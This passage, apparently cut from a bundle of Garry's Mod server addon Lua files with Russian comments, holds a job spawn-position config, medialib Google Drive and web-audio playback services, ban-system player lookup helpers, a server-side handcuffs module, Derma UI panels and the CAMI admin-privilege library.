--|             [3] После уже выше сделанного пункта,вставньте на предпологаемое место спавна и пропишите в консоли комманду 'player_position';
--|             [4] Позиция автоматически копируется,вам просто следует зайти в конфиг и стереть старый Vector(x,y,z) и вставить новый.
   
   spawnInt.configuration.mainSpawn = Vector(94.435814,-2725.402832,72.031250)
   
--| Имя: Позиция для спавна игроков с определенными работами
--|__________________________________________________________/
--| Инструкция: Всякий раз,когда вам нужно установить место спавна для профессии,
--|             используйте этот пример:
--|______________________________________________________________________________
/*
   spawnInt.configuration.RegisterTeam["Любой заголовок на английском языке"] = {
	 pos = <vector>
   }

    vector - позиция,где будет появлятся игрок;
             Вам нужно выбрать место на вашей карте и прописать в консоли: player_position
             После копируйте,что вам выдало в чате и вставляете в pos = Vector(3,3,3)

    [>>] В данном случае <vector> будет Vector(-3826, 5080, -31)

    В Итоге,когда все нужные данные собраны,мы создаем позицию:
    
    spawnInt.configuration.RegisterTeam["Gun Dealer"] = {
	   pos = Vector(-3826, 5080, -31)
    }

*/

spawnInt.configuration.RegisterTeam["Офицер Полиции"] = {
    pos = Vector(4315.048828,-647.153687,72.031250)
}

spawnInt.configuration.RegisterTeam["Начальник полиции"] = {
    pos = Vector(3996.880859,-1027.280762,72.031250)
}

spawnInt.configuration.RegisterTeam["Медик спецназа"] = {
    pos = Vector(4651.999512,-892.643066,72.031250)
}

spawnInt.configuration.RegisterTeam["Спецназ"] = {
    pos = Vector(4533.817871,-560.773499,72.031250)
}

spawnInt.configuration.RegisterTeam["Снайпер спецназа"] = {
    pos = Vector(4651.999512,-892.643066,72.031250)
}

spawnInt.configuration.RegisterTeam["Агент FBI"] = {
    pos = Vector(4651.999512,-892.643066,72.031250)
}

spawnInt.configuration.RegisterTeam["Командир спецназа"] = {
    pos = Vector(4651.999512,-892.643066,72.031250)
}

spawnInt.configuration.RegisterTeam["Джаггернаут"] = {
    pos = Vector(4651.999512,-892.643066,72.031250)
}

spawnInt.configuration.RegisterTeam["Бездомный"] = {
    pos = Vector(149.589828,1294.158691,72.031250)
}
--PATH MediaLib_DynFile_gdrive.lua:
local oop = medialib.load("oop")

local GDriveService = oop.class("GDriveService", "HTMLService")
GDriveService.identifier = "GDrive"

local all_patterns = {"^https?://drive.google.com/file/d/([^/]*)/edit"}

function GDriveService:parseUrl(url)
	for _,pattern in pairs(all_patterns) do
		local id = string.match(url, pattern)
		if id then
			return {id = id}
		end
	end
end

function GDriveService:isValidUrl(url)
	return self:parseUrl(url) ~= nil
end

local function urlencode(str)
   if (str) then
      str = string.gsub (str, "\n", "\r\n")
      str = string.gsub (str, "([^%w ])",
         function (c) return string.format ("%%%02X", string.byte(c)) end)
      str = string.gsub (str, " ", "+")
   end
   return str
end

local player_url = "https://wyozi.github.io/gmod-medialib/mp4.html?id=%s"
local gdrive_stream_url = "https://drive.google.com/uc?export=download&confirm=yTib&id=%s"
function GDriveService:resolveUrl(url, callback)
	local urlData = self:parseUrl(url)
	local playerUrl = string.format(player_url, urlencode(string.format(gdrive_stream_url, urlData.id)))

	callback(playerUrl, {start = urlData.start})
end

function GDriveService:directQuery(url, callback)
	callback(nil, {
		title = url:match("([^/]+)$")
	})
end

function GDriveService:hasReliablePlaybackEvents()
	return true
end

return GDriveService
--PATH MediaLib_DynFile_webaudio.lua:
local oop = medialib.load("oop")
local WebAudioService = oop.class("WebAudioService", "BASSService")
WebAudioService.identifier = "webaudio"

local all_patterns = {
	"^https?://(.*)%.mp3",
	"^https?://(.*)%.ogg",
}

function WebAudioService:parseUrl(url)
	for _,pattern in pairs(all_patterns) do
		local id = string.match(url, pattern)
		if id then
			return {id = id}
		end
	end
end

function WebAudioService:isValidUrl(url)
	return self:parseUrl(url) ~= nil
end

function WebAudioService:resolveUrl(url, callback)
	callback(url, {})
end

function WebAudioService:directQuery(url, callback)
	callback(nil, {
		title = url:match("([^/]+)$")
	})
end

return WebAudioService
--PATH addons/_bansys/lua/autorun/sh_players.lua:

neuro = neuro or {}
local PLAYER = FindMetaTable( "Player" )
function neuro.IsPlayer(info)
	return (type(info) == 'Player')
end

function neuro.IsSteamID(info)
	return (type(info) == 'string' and info:match('^STEAM_%d:%d:%d+$'))
end

function neuro.FindPlayer(info) 
	if not info or info == '' then return nil end
	for k, pl in player.Iterator() do
		if info == pl:SteamID() or info == pl:SteamID64() then
			return pl
		end

		if string.find(string.lower(pl:Name()), string.lower(tostring(info)), 1, true) ~= nil then
			return pl
		end
	end
	return nil
end

function neuro.InfoTo64(info)
	return (neuro.IsPlayer(info) and info:SteamID64() or util.SteamIDTo64(info))
end

function neuro.InfoTo32(info)
	return (neuro.IsPlayer(info) and info:SteamID() or (neuro.IsSteamID(info) and info or util.SteamIDFrom64(info)))
end

function PLAYER:NameID()
	return (self:Name() .. '(' .. self:SteamID() .. ')')
end

function neuro.GetName(steamid)
    toret = "suka"
    if IsValid(player.GetBySteamID(neuro.InfoTo32(steamid))) then
        toret = player.GetBySteamID(neuro.InfoTo32(steamid)):Nick()
    end
    return toret
end
--PATH addons/cuffs/lua/autorun/sv_handcuffs.lua:
-------------------------------------
---------------- Cuffs --------------
-------------------------------------
-- Copyright (c) 2015 Nathan Healy --
-------- All rights reserved --------
-------------------------------------
-- sv_handcuffs.lua         SERVER --
--                                 --
-- Server-side handcuff stuff.     --
-------------------------------------

if CLIENT then return end

util.AddNetworkString( "Cuffs_GagPlayer" )
util.AddNetworkString( "Cuffs_BlindPlayer" )
util.AddNetworkString( "Cuffs_FreePlayer" )
util.AddNetworkString( "Cuffs_DragPlayer" )

util.AddNetworkString( "Cuffs_TiePlayers" )
util.AddNetworkString( "Cuffs_UntiePlayers" )

local function GetTrace( ply )
	local tr = util.TraceLine( {start=ply:EyePos(), endpos=ply:EyePos()+(ply:GetAimVector()*100), filter=ply} )
	if IsValid(tr.Entity) and tr.Entity:IsPlayer() then
		local cuffed,wep = tr.Entity:IsHandcuffed()
		if cuffed then return tr,wep end
	end
end

//
// Standard hooks
CreateConVar( "cuffs_restrictsuicide", 1, {FCVAR_ARCHIVE,FCVAR_SERVER_CAN_EXECUTE} )
hook.Add( "CanPlayerSuicide", "Cuffs RestrictSuicide", function( ply )
	if ply:IsHandcuffed() and cvars.Bool("cuffs_restrictarrest") then return false end
end)

CreateConVar( "cuffs_restrictteams", 1, {FCVAR_ARCHIVE,FCVAR_SERVER_CAN_EXECUTE} )
hook.Add( "PlayerCanJoinTeam", "Cuffs RestrictTeam", function( ply )
	if ply:IsHandcuffed() and cvars.Bool("cuffs_restrictteams") then return false end
end)

-- Таблица для хранения состояний игроков
local voiceGagStates = {}

-- Функция для обновления состояний глушения
local function updateVoiceGagStates()
	voiceGagStates = {}
    for _, ply in player.Iterator() do
        if IsValid(ply) then
            local cuffed, wep = ply:IsHandcuffed()
            if cuffed and wep:GetIsGagged() then
                voiceGagStates[ply] = true
            else
                voiceGagStates[ply] = false
            end
        end
    end
end

-- Таймер для периодического обновления состояний
timer.Create("UpdateVoiceGagStates", 1.5, 0, updateVoiceGagStates)

-- Хук, который использует предварительно вычисленные значения
hook.Add("PlayerCanHearPlayersVoice", "Cuffs VoiceGag", function(listener, speaker)
    if voiceGagStates[speaker] then
        return false
    end
end)

hook.Add( "PlayerCanSeePlayersChat", "Cuffs ChatGag", function( _,_,_, ply )
	if voiceGagStates[ply] then
		return false
	end
end)

// Sandbox //
hook.Add( "PlayerSpawnProp", "Cuffs PreventPropSpawn", function( ply, mdl )
	if IsValid(ply) and ply:IsHandcuffed() then
		return false
	end
end)


// 
// DarkRP
CreateConVar( "cuffs_restrictwarrant", 1, {FCVAR_ARCHIVE,FCVAR_SERVER_CAN_EXECUTE,FCVAR_REPLICATED} )
hook.Add( "canRequestWarrant", "Cuffs PreventWarrant", function( crim, cop, reason )
	if cvars.Bool("cuffs_restrictwarrant") and cop:IsHandcuffed() then return false,"Вы не можете брать ордер в наручниках!" end
end)
hook.Add( "canWanted", "Cuffs PreventWarrant", function( crim, cop, reason )
	if cvars.Bool("cuffs_restrictwarrant") and cop:IsHandcuffed() then return false,"Вы не можете брать ордер в наручниках!" end
end)
CreateConVar( "cuffs_restrictarrest", 1, {FCVAR_ARCHIVE,FCVAR_SERVER_CAN_EXECUTE} )

hook.Add( "canArrest", "Cuffs RestrictArrest", function( cop, crim ) // DarkRP Arrest hook
	if IsValid(crim) and cvars.Bool("cuffs_restrictarrest") then
		local cuffed, wep = crim:IsHandcuffed()
		
		if not cuffed then
			return false,"Вы должны заковать нарушителя в наручники, чтобы арестовать его!"
		elseif not wep.CuffsArrestable then
			return false,"Это не полицейские наручники."
		end
	end
end)
hook.Add( "playerCanChangeTeam", "Cuffs RestrictTeam", function( ply, tm, force )
	if ply:IsHandcuffed() and cvars.Bool("cuffs_restrictteams") and not force then return false,"Вы не можете менять работу в наручниках!" end
end)
hook.Add( "CanChangeRPName", "Cuffs RestrictName", function( ply )
	if ply:IsHandcuffed() then return false,"Вы не можете менять имя в наручниках!" end
end)

// Think
timer.Create("RemoveStruchok",30,0,function()
	for _,v in ents.Iterator() do
		if v.IsHandcuffHook and v.TiedHandcuffs then
			for i=#v.TiedHandcuffs,0,-1 do
				if not IsValid(v.TiedHandcuffs[i]) then
					table.remove( v.TiedHandcuffs, i )
				end
			end
			if #v.TiedHandcuffs<=0 then
				v:Remove()
				continue
			end
		end
	end
end)

//
// Cuffed player interaction
net.Receive( "Cuffs_GagPlayer", function(_,ply)
	if (not IsValid(ply)) or ply:IsHandcuffed() then return end
	
	local target = net.ReadEntity()
	if (not IsValid(target)) or target==ply then return end
	
	local cuffed, cuffs = target:IsHandcuffed()
	if not (cuffed and IsValid(cuffs) and cuffs:GetCanGag()) then return end
	
	local tr = GetTrace(ply)
	if not (tr and tr.Entity==target) then return end
	
	local shouldGag = net.ReadBit()==1
	cuffs:SetIsGagged( shouldGag )
	hook.Call( shouldGag and "OnHandcuffGag" or "OnHandcuffUnGag", GAMEMODE, ply, target, cuffs )
end)
net.Receive( "Cuffs_BlindPlayer", function(_,ply)
	if (not IsValid(ply)) or ply:IsHandcuffed() then return end
	
	local target = net.ReadEntity()
	if (not IsValid(target)) or target==ply then return end
	
	local cuffed, cuffs = target:IsHandcuffed()
	if not (cuffed and IsValid(cuffs) and cuffs:GetCanBlind()) then return end
	
	local tr = GetTrace(ply)
	if not (tr and tr.Entity==target) then return end
	
	local shouldBlind = net.ReadBit()==1
	cuffs:SetIsBlind( shouldBlind )
	hook.Call( shouldBlind and "OnHandcuffBlindfold" or "OnHandcuffUnBlindfold", GAMEMODE, ply, target, cuffs )
end)
net.Receive( "Cuffs_FreePlayer", function(_,ply)
	if (not IsValid(ply)) or ply:IsHandcuffed() then return end
	
	local target = net.ReadEntity()
	if (not IsValid(target)) or target==ply then return end
	
	local cuffed, cuffs = target:IsHandcuffed()
	if not (cuffed and IsValid(cuffs)) then return end
	if IsValid(cuffs:GetFriendBreaking()) then return end
	
	local tr = GetTrace(ply)
	if not (tr and tr.Entity==target) then return end
	
	cuffs:SetFriendBreaking( ply )
end)
net.Receive( "Cuffs_DragPlayer", function(_,ply)
	if (not IsValid(ply)) or ply:IsHandcuffed() then return end
	
	local target = net.ReadEntity()
	if (not IsValid(target)) or target==ply then return end
	
	local cuffed, cuffs = target:IsHandcuffed()
	if not (cuffed and IsValid(cuffs) and cuffs:GetRopeLength()>0) then return end
	
	local tr = GetTrace(ply)
	if not (tr and tr.Entity==target) then return end
	
	local shouldDrag = net.ReadBit()==1
	if shouldDrag then
		if not (IsValid(cuffs:GetKidnapper())) then
			cuffs:SetKidnapper( ply )
			hook.Call( "OnHandcuffStartDragging", GAMEMODE, ply, target, cuffs )
		end
	else
		if ply==cuffs:GetKidnapper() then
			cuffs:SetKidnapper( nil )
			hook.Call( "OnHandcuffStopDragging", GAMEMODE, ply, target, cuffs )
		end
	end
end)

local HookModel = Model("models/props_c17/TrapPropeller_Lever.mdl")
net.Receive( "Cuffs_TiePlayers", function(_,ply)
	if (not IsValid(ply)) or ply:IsHandcuffed() then return end
	
	local DraggedCuffs = {}
	for _,c in pairs(ents.FindByClass("weapon_handcuffed")) do
		if c:GetRopeLength()>0 and c:GetKidnapper()==ply then
			table.insert( DraggedCuffs, c )
		end
	end
	if #DraggedCuffs<=0 then return end
	
	local tr = util.TraceLine( {start=ply:EyePos(), endpos=ply:EyePos()+(ply:GetAimVector()*100), filter=ply} )
	if not tr.Hit then return end

	if IsValid(tr.Entity) then // Pass to another player
		if tr.Entity:IsPlayer() then
			for i=1,#DraggedCuffs do
				if DraggedCuffs[i].Owner==tr.Entity then
					DraggedCuffs[i]:SetKidnapper(nil)
					hook.Call( "OnHandcuffStopDragging", GAMEMODE, ply, DraggedCuffs[i].Owner, DraggedCuffs[i] )
				else
					DraggedCuffs[i]:SetKidnapper(tr.Entity)
					hook.Call( "OnHandcuffStopDragging", GAMEMODE, ply, DraggedCuffs[i].Owner, DraggedCuffs[i] )
					hook.Call( "OnHandcuffStartDragging", GAMEMODE, tr.Entity, DraggedCuffs[i].Owner, DraggedCuffs[i] )
				end
			end
			return
		elseif tr.Entity.IsHandcuffHook and tr.Entity.TiedHandcuffs then
			for i=1,#DraggedCuffs do
				DraggedCuffs[i]:SetKidnapper(tr.Entity)
				table.insert( tr.Entity.TiedHandcuffs, DraggedCuffs[i] )
				hook.Call( "OnHandcuffStopDragging", GAMEMODE, ply, DraggedCuffs[i].Owner, DraggedCuffs[i] )
				hook.Call( "OnHandcuffTied", GAMEMODE, ply, DraggedCuffs[i].Owner, DraggedCuffs[i], tr.Entity )
			end
			return
		end
	end
	
	local hk = ents.Create("prop_physics")
	hk:SetPos( tr.HitPos + tr.HitNormal )
	local ang = tr.HitNormal:Angle()
	ang:RotateAroundAxis( ang:Up(), -90 )
	hk:SetAngles( ang )
	hk:SetModel( HookModel )
	hk:Spawn()
	
	-- hk:SetMoveType( MOVETYPE_NONE )
	if IsValid(tr.Entity) then
		hk:SetParent( tr.Entity )
		hk:SetMoveType( MOVETYPE_VPHYSICS )
	else
		hk:SetMoveType( MOVETYPE_NONE )
	end
	hk:SetCollisionGroup( COLLISION_GROUP_WEAPON )

	hk:SetNWBool("Cuffs_TieHook", true)
	hk.IsHandcuffHook = true
	hk.TiedHandcuffs = {}	
	
	for i=1,#DraggedCuffs do
		DraggedCuffs[i]:SetKidnapper( hk )
		table.insert( hk.TiedHandcuffs, DraggedCuffs[i] )
		hook.Call( "OnHandcuffStopDragging", GAMEMODE, ply, DraggedCuffs[i].Owner, DraggedCuffs[i] )
		hook.Call( "OnHandcuffTied", GAMEMODE, ply, DraggedCuffs[i].Owner, DraggedCuffs[i], hk )
	end
end)

local function DoUntie( ply, ent )
	for i=1,#ent.TiedHandcuffs do
		if not IsValid(ent.TiedHandcuffs[i]) then continue end
		
		ent.TiedHandcuffs[i]:SetKidnapper( ply )
		hook.Call( "OnHandcuffUnTied", GAMEMODE, ply, ent.TiedHandcuffs[i].Owner, ent.TiedHandcuffs[i], ent )
		hook.Call( "OnHandcuffStartDragging", GAMEMODE, ply, ent.TiedHandcuffs[i].Owner, ent.TiedHandcuffs[i] )
	end
	
	ent:Remove()
end
net.Receive( "Cuffs_UntiePlayers", function(_,ply)
	if (not IsValid(ply)) or ply:IsHandcuffed() then return end
	
	local tr = util.TraceLine( {start=ply:EyePos(), endpos=ply:EyePos()+(ply:GetAimVector()*100), filter=ply} )
	if IsValid(tr.Entity) and tr.Entity.IsHandcuffHook and tr.Entity.TiedHandcuffs then
		DoUntie( ply, tr.Entity )
	end
end)
hook.Add( "AllowPlayerPickup", "Cuffs UntieHook", function(ply,ent)
	if IsValid(ent) and ent.IsHandcuffHook and ent.TiedHandcuffs then
		if (not IsValid(ply)) or ply:IsHandcuffed() then return end
		
		DoUntie( ply, ent )
		return false
	end
end)


--PATH addons/dermaf4/lua/ui/controls/playerrequest.lua:
local PANEL = {}

function PANEL:Init()
	self.Players = player.GetAll()

	self.SearchBar = ui.Create('DTextEntry', self)
	self.SearchBar:RequestFocus()
	self.SearchBar:SetPlaceholderText('Поиск...')
	self.SearchBar.OnChange = function(s)
		self.PlayerList:AddPlayers(s:GetValue())
	end

	self.PlayerList = ui.Create('ui_listview', self)
	self.PlayerList.AddPlayers = function(s, inf)
		inf = inf and inf:Trim()

		s:Reset()

		local count = 0
		for k, v in ipairs(self.Players) do
			if IsValid(v) and (v ~= LocalPlayer()) then
				if (not inf) or (inf and string.find(v:Name():lower(), inf:lower(), 1, true) or (v:SteamID() == inf) or (v:SteamID64() == inf)) then
					s:AddPlayer(v).DoClick = function(row) self:OnSelection(row, v) end
					count = count + 1
				end
			end
		end

		if (count <= 0) then
			s:AddSpacer('Игроки не найдены')
		end
	end

	self.PlayerList:AddPlayers()
end

function PANEL:PerformLayout()
	self.SearchBar:SetPos(0, 0)
	self.SearchBar:SetSize(self:GetWide(), 25)

	self.PlayerList:SetPos(0, 30)
	self.PlayerList:SetSize(self:GetWide(), self:GetTall() - 30)
end

function PANEL:SetPlayers(pls)
	self.Players = pls
	self.PlayerList:AddPlayers()
end

function PANEL:OnSelection(row, pl)

end

function PANEL:DockToFrame()
	local p = self:GetParent()
	local x, y = p:GetDockPos()
	self:SetPos(x, y)
	self:SetSize(p:GetWide() - 10, p:GetTall() - (y + 5))
end

vgui.Register('ui_playerrequest', PANEL, 'Panel')
--PATH addons/dermaf4/lua/ui/controls/tablist.lua:
local PANEL = {}

function PANEL:Init()
	self.tabList = ui.Create('ui_scrollpanel', function(list)
		list:SetSize(160, 0)
		list:Dock(LEFT)
		list:SetPadding(-1)
	end, self)

	self.Buttons = {}
end

function PANEL:GetButtons()
	return self.Buttons
end

function PANEL:SetActiveTab(num)
	self.ActiveTabID = num

	for k, v in ipairs(self.Buttons) do
		v.Active = (num == k)

		if IsValid(v.Tab) and v.Tab:IsVisible() then
			v.Tab:Dock(NODOCK)
			v.Tab:SetVisible(false)
		end

		if (num == k) then
			if (not v.FinishedLayout) then
				v:LayoutTab()
			end

			v.Tab:SetVisible(true)
			v.Tab:DockMargin(0, 0, 0, 0)
			v.Tab:Dock(FILL)

			self:TabChanged(v.Tab)
		end
	end
end

function PANEL:TabChanged(tab)

end

function PANEL:GetActiveTab()
	for k, v in ipairs(self.Buttons) do
		if (v.Active) then
			return v.Tab
		end
	end
end

function PANEL:GetActiveTabID()
	return self.ActiveTabID
end

local function newbtn(title, tab, func)
	local button = ui.Create('DButton', function(btn)
		btn:SetSize(0, 38)
		btn:SetText(title)
		btn:SetFont('ui.24')
		btn:SetTextColor(ui.col.White)

		btn.DoClick = function(self)
			func(self)
		end

		btn.Paint = function(btn, w, h)
			derma.SkinHook('Paint', 'TabButton', btn, w, h)
		end
	end)

	function button:PerformLayout()
		if IsValid(self.m_Image) then
			self:SetContentAlignment(4)
			self.m_Image:SetPos(1, 1)
			self.m_Image:SetSize(36, 36)
			self:SetTextInset(self.m_Image:GetWide() + 5, 0)
		end
		DLabel.PerformLayout(self)
	end

	return button
end

function PANEL:AddTab(title, callback, active)
	local button = newbtn(title, tab, function(s)
		if (not s.FinishedLayout) then
			s:LayoutTab()
		end

		self:SetActiveTab(s.ID)
	end)

	function button.LayoutTab(s)
		local tab = isfunction(callback) and callback(self) or callback

		tab.Paint = function(tab, w, h) end
		tab:SetSize(self:GetWide() - 160, self:GetTall())
		tab:SetVisible(false)
		tab:SetParent(self)
		tab:SetSkin(self:GetSkin().PrintName)

		s.Tab = tab
		s.FinishedLayout = true
	end

	if (not isfunction(callback)) then
		button:LayoutTab()
	end

	button.ID = table.insert(self.Buttons, button)
	self.tabList:AddItem(button)

	if active then
		self:SetActiveTab(button.ID)
	end

	return button
end

local fr
function PANEL:AddButton(title, func)
	local button = newbtn(title, tab, func)

	self.tabList:AddItem(button)
	table.insert(self.Buttons, btn)

	fr = self
	return button
end

function PANEL:DockToFrame()
	local p = self:GetParent()
	local x, y = p:GetDockPos()
	y = y - 6
	self:SetPos(0, y)
	self:SetSize(p:GetWide(), p:GetTall() - y)
end

function PANEL:Paint(w, h)
	derma.SkinHook('Paint', 'TabListPanel', self, w, h)
end

vgui.Register('ui_tablist', PANEL, 'Panel')
--PATH addons/_adminmodules/lua/ulib/shared/cami_global.lua:
--[[
CAMI - Common Admin Mod Interface.
Makes admin mods intercompatible and provides an abstract privilege interface
for third party addons.

IMPORTANT: This is a draft script. It is very much WIP.

Follows the specification on this page:
https://docs.google.com/document/d/1QIRVcAgZfAYf1aBl_dNV_ewR6P25wze2KmUVzlbFgMI


Structures:
	CAMI_USERGROUP, defines the charactaristics of a usergroup:
	{
		Name
			string
			The name of the usergroup
		Inherits
			string
			The name of the usergroup this usergroup inherits from
	}

	CAMI_PRIVILEGE, defines the charactaristics of a privilege:
	{
		Name
			string
			The name of the privilege
		MinAccess
			string
			One of the following three: user/admin/superadmin
		HasAccess
			function(
				privilege :: CAMI_PRIVILEGE,
				actor     :: Player,
				target    :: Player
			) :: bool
			optional
			Function that decides whether a player can execute this privilege,
			optionally on another player (target).
	}
]]

-- Version number in YearMonthDay format.
local version = 20150902.1

if CAMI and CAMI.Version >= version then return end

CAMI = CAMI or {}
CAMI.Version = version

--[[
usergroups
	Contains the registered CAMI_USERGROUP usergroup structures.
	Indexed by usergroup name.
]]
local usergroups = CAMI.GetUsergroups and CAMI.GetUsergroups() or {
	user = {
		Name = "user",
		Inherits = "user"
	},
	admin = {
		Name = "admin",
		Inherits = "user"
	},
	superadmin = {
		Name = "superadmin",
		Inherits = "admin"
	}
}

--[[
privileges
	Contains the registered CAMI_PRIVILEGE privilege structures.
	Indexed by privilege name.
]]
local privileges = CAMI.GetPrivileges and CAMI.GetPrivileges() or {}

--[[
CAMI.RegisterUsergroup
	Registers a usergroup with CAMI.

	Parameters:
		usergroup
			CAMI_USERGROUP
			(see CAMI_USERGROUP structure)
		source
			any
			Identifier for your own admin mod. Can be anything.
			Use this to make sure CAMI.RegisterUsergroup function and the
			CAMI.OnUsergroupRegistered hook don't cause an infinite loop



	Return value:
		CAMI_USERGROUP
			The usergroup given as argument.
]]
function CAMI.RegisterUsergroup(usergroup, source)
	usergroups[usergroup.Name] = usergroup

	hook.Call("CAMI.OnUsergroupRegistered", nil, usergroup, source)
	return usergroup
end

--[[
CAMI.UnregisterUsergroup
	Unregisters a usergroup from CAMI. This will call a hook that will notify
	all other admin mods of the removal.

	Call only when the usergroup is to be permanently removed.

	Parameters:
		usergroupName
			string
			The name of the usergroup.
		source
			any
			Identifier for your own admin mod. Can be anything.
			Use this to make sure CAMI.UnregisterUsergroup function and the
			CAMI.OnUsergroupUnregistered hook don't cause an infinite loop

	Return value:
		bool
			Whether the unregistering succeeded.
]]
function CAMI.UnregisterUsergroup(usergroupName, source)
	if not usergroups[usergroupName] then return false end

	local usergroup = usergroups[usergroupName]
	usergroups[usergroupName] = nil

	hook.Call("CAMI.OnUsergroupUnregistered", nil, usergroup, source)

	return true
end

--[[
CAMI.GetUsergroups
	Retrieves all registered usergroups.

	Return value:
		Table of CAMI_USERGROUP, indexed by their names.
]]
function CAMI.GetUsergroups()
	return usergroups
end

--[[
CAMI.GetUsergroup
	Receives information about a usergroup.

	Return value:
		CAMI_USERGROUP
			Returns nil when the usergroup does not exist.
]]
function CAMI.GetUsergroup(usergroupName)
	return usergroups[usergroupName]
end

--[[
CAMI.UsergroupInherits
	Returns true when usergroupName1 inherits usergroupName2.
	Note that usergroupName1 does not need to be a direct child.
	Every usergroup trivially inherits itself.

	Parameters:
		usergroupName1
			string
			The name of the usergroup that is queried.
		usergroupName2
			string
			The name of the usergroup of which is queried whether usergroupName1
			inherits from.

	Return value:
		bool
			Whether usergroupName1 inherits usergroupName2.
]]
function CAMI.UsergroupInherits(usergroupName1, usergroupName2)
	repeat
		if usergroupName1 == usergroupName2 then return true end

		usergroupName1 = usergroups[usergroupName1] and
						 usergroups[usergroupName1].Inherits or
						 usergroupName1
	until not usergroups[usergroupName1] or
		  usergroups[usergroupName1].Inherits == usergroupName1

	-- One can only be sure the usergroup inherits from user if the
	-- usergroup isn't registered.
	return usergroupName1 == usergroupName2 or usergroupName2 == "user"
end

--[[
CAMI.InheritanceRoot
	All usergroups must eventually inherit either user, admin or superadmin.
	Regardless of what inheritance mechism an admin may or may not have, this
	always applies.

	This method always returns either user, admin or superadmin, based on what
	usergroups eventually inherit.

	Parameters:
		usergroupName
			string
			The name of the usergroup of which the root of inheritance is
			requested

	Return value:
		string
			The name of the root usergroup (either user, admin or superadmin)
]]
function CAMI.InheritanceRoot(usergroupName)
	if not usergroups[usergroupName] then return end

	local inherits = usergroups[usergroupName].Inherits
	while inherits ~= usergroups[usergroupName].Inherits do
		usergroupName = usergroups[usergroupName].Inherits
	end

	return usergroupName
end

--[[
CAMI.RegisterPrivilege
	Registers a privilege with CAMI.
	Note: do NOT register all your admin mod's privileges with this function!
	This function is for third party addons to register privileges
	with admin mods, not for admin mods sharing the privileges amongst one
	another.

	Parameters:
		privilege
			CAMI_PRIVILEGE
			See CAMI_PRIVILEGE structure.

	Return value:
		CAMI_PRIVILEGE
			The privilege given as argument.
]]
function CAMI.RegisterPrivilege(privilege)
	privileges[privilege.Name] = privilege

	hook.Call("CAMI.OnPrivilegeRegistered", nil, privilege)

	return privilege
end

--[[
CAMI.UnregisterPrivilege
	Unregisters a privilege from CAMI. This will call a hook that will notify
	all other admin mods of the removal.

	Call only when the privilege is to be permanently removed.

	Parameters:
		privilegeName
			string
			The name of the privilege.

	Return value:
		bool
			Whether the unregistering succeeded.
]]
function CAMI.UnregisterPrivilege(privilegeName)
	if not privileges[privilegeName] then return false end

	local privilege = privileges[privilegeName]
	privileges[privilegeName] = nil

	hook.Call("CAMI.OnPrivilegeUnregistered", nil, privilege)

	return true
end

--[[
CAMI.GetPrivileges
	Retrieves all registered privileges.

	Return value:
		Table of CAMI_PRIVILEGE, indexed by their names.
]]
function CAMI.GetPrivileges()
	return privileges
end

--[[
CAMI.GetPrivilege
	Receives information about a privilege.

	Return value:
		CAMI_PRIVILEGE when the privilege exists.
			nil when the privilege does not exist.
]]
function CAMI.GetPrivilege(privilegeName)
	return privileges[privilegeName]
end

--[[
CAMI.PlayerHasAccess
	Queries whether a certain player has the right to perform a certain action.
	Note: this function does NOT return an immediate result!
	The result is in the callback!

	Parameters:
		actorPly
			Player
			The player of which is requested whether they have the privilege.
		privilegeName
			string
			The name of the privilege.
		callback
			function(bool, string)
			This function will be called with the answer. The bool signifies the
			yes or no answer as to whether the player is allowed. The string
			will optionally give a reason.
		targetPly
			Optional.
			The player on which the privilege is executed.
		extraInfoTbl
			Optional.
			Table containing extra information.
			Officially supported members:
				Fallback
					string
					Either of user/admin/superadmin. When no admin mod replies,
					the decision is based on the admin status of the user.
					Defaults to admin if not given.
				IgnoreImmunity
					bool
					Ignore any immunity mechanisms an admin mod might have.
				CommandArguments
					table
					Extra arguments that were given to the privilege command.

	Return value:
		None, the answer is given in the callback function in order to allow
		for the admin mod to perform e.g. a database lookup.
]]
-- Default access handler
local defaultAccessHandler = {["CAMI.PlayerHasAccess"] =
	function(_, actorPly, privilegeName, callback, _, extraInfoTbl)
		-- The server always has access in the fallback
		if not IsValid(actorPly) then return callback(true, "Fallback.") end

		local priv = privileges[privilegeName]

		local fallback = extraInfoTbl and (
			not extraInfoTbl.Fallback and actorPly:IsAdmin() or
			extraInfoTbl.Fallback == "user" and true or
			extraInfoTbl.Fallback == "admin" and actorPly:IsAdmin() or
			extraInfoTbl.Fallback == "superadmin" and actorPly:IsSuperAdmin())


		if not priv then return callback(fallback, "Fallback.") end

		callback(
			priv.MinAccess == "user" or
			priv.MinAccess == "admin" and actorPly:IsAdmin() or
			priv.MinAccess == "superadmin" and actorPly:IsSuperAdmin()
			, "Fallback.")
	end,
	["CAMI.SteamIDHasAccess"] =
	function(_, _, _, callback)
		callback(false, "No information available.")
	end
}
function CAMI.PlayerHasAccess(actorPly, privilegeName, callback, targetPly,
extraInfoTbl)
	hook.Call("CAMI.PlayerHasAccess", defaultAccessHandler, actorPly,
		privilegeName, callback, targetPly, extraInfoTbl)
end

--[[
CAMI.GetPlayersWithAccess
	Finds the list of currently joined players who have the right to perform a
	certain action.
	NOTE: this function will NOT return an immediate result!
	The result is in the callback!

	Parameters:
		privilegeName
			string
			The name of the privilege.
		callback
			function(players)
			This function will be called with the list of players with access.
		targetPly
			Optional.
			The player on which the privilege is executed.
		extraInfoTbl
			Optional.
			Table containing extra information.
			Officially supported members:
				Fallback
					string
					Either of user/admin/superadmin. When no admin mod replies,
					the decision is based on the admin status of the user.
					Defaults to admin if not given.
				IgnoreImmunity
					bool
					Ignore any immunity mechanisms an admin mod might have.
				CommandArguments
					table
					Extra arguments that were given to the privilege command.
]]
function CAMI.GetPlayersWithAccess(privilegeName, callback, targetPly,
extraInfoTbl)
	local allowedPlys = {}
	local allPlys = player.GetAll()
	local countdown = #allPlys

	local function onResult(ply, hasAccess, _)
		countdown = countdown - 1

		if hasAccess then table.insert(allowedPlys, ply) end
		if countdown == 0 then callback(allowedPlys) end
	end

	for _, ply in pairs(allPlys) do
		CAMI.PlayerHasAccess(ply, privilegeName,
			function(...) onResult(ply, ...) end,
			targetPly, extraInfoTbl)
	end
end

--[[
CAMI.SteamIDHasAccess
	Queries whether a player with a steam ID has the right to perform a certain
	action.
	Note: the player does not need to be in the server for this to
	work.

	Note: this function does NOT return an immediate result!
	The result is in the callback!

	Parameters:
		actorSteam
			Player
			The SteamID of the player of which is requested whether they have
			the privilege.
		privilegeName
			string
			The name of the privilege.
		callback
			function(bool, string)
			This function will be called with the answer. The bool signifies the
			yes or no answer as to whether the player is allowed. The string
			will optionally give a reason.
		targetSteam
			Optional.
			The SteamID of the player on which the privilege is executed.
		extraInfoTbl
			Optional.
			Table containing extra information.
